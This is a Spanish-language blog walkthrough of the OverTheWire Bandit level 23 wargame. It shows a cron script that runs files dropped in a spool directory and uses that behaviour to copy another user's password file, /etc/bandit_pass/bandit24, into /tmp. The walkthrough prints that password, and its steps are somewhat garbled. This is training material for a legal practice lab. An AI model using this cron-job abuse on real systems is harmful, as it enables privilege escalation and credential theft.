Bandit 23 / Overthewire

octubre 29, 2023

  • bandit
  • ssh
  • sshpass
  • linux
  • bash

Información

*A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…*

Resolución

Leyendo el archivo ejecutable / Primer paso

bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

Leyendo por encima el código podemos ver que cada cierto tiempo elimina todos los archivos del directorio: /var/spool/bandit24/foo/ pero antes de borrarlos verifica quien es el creador de estos, si es bandit23 entonces ejecutara el código, de lo contrario solo lo eliminará.

Creando nuestro primer script en bash / Segundo paso

Una vez sabemos lo que hace el archivo tendremos que crear un archivo que nos muestre la contraseña de bandit24, que estaba en /etc/bandit_pass/bandit24, ahora si nos dirigimos al directorio y creamos el siguiente archivo:

touch /tmp/bandit24pass
cat /etc/bandit_pass/bandit24 >> /tmp/bandit24pass

Una vez creado este archivo (da igual el nombre), le daremos permisos de ejecución:

chmod +x !$

Leyendo la contraseña / Último paso

Esperamos un poco y ya tendríamos un archivo en el directorio /tmp/ con la contraseña del archivo /etc/bandit_pass/bandit24, es decir, del usuario bandit24.

bandit23@bandit:/etc/cron.d$ cat /tmp/bandit24pass
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

Y aquí finalizamos el apartado de tareas cron, recuerda que si no has entendido algo, puedes contactarme por WhatsApp.
